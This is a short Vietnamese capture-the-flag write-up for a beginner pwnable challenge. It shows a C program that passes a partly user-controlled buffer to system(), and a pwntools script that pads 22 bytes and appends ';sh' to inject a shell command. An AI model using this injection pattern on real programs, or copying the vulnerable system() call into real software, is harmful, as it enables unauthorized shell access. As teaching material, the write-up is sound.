# Linux Command---Write-up-----KCSC Recruitment 2025
Hướng dẫn cách giải bài Linux Command cho anh em mới chơi pwnable.

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 9/8/2026

## 1. Mục tiêu
```C
#include <stdio.h>
#include <string.h>
void hidden()
{
    printf("Semicolon Operator in Linux");
    printf("part 1: KCSC{Linux_");
}

int main()
{
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    setbuf(stderr, 0);
    printf("What is your name: ");
    char name[0x20];
    scanf("%31s", name);
    strncpy(name, "echo \"Welcome to KCSC\"", 22);
    system(name);
}
```

Hàm `strncpy` sẽ copy tất cả nội dung `"echo \"Welcome to KCSC\""` vào đầu `name`, vậy thì chúng ta chỉ cần điền padding 22 byte vào biến `name` và ghi thêm `;sh` là xong bài.

## 2. Cách thực thi
```Python
from pwn import *

p = process('./chall')

payload = b'A' * 22 + b';sh'
p.sendlineafter(b'What is your name: ', payload)

p.interactive()
```
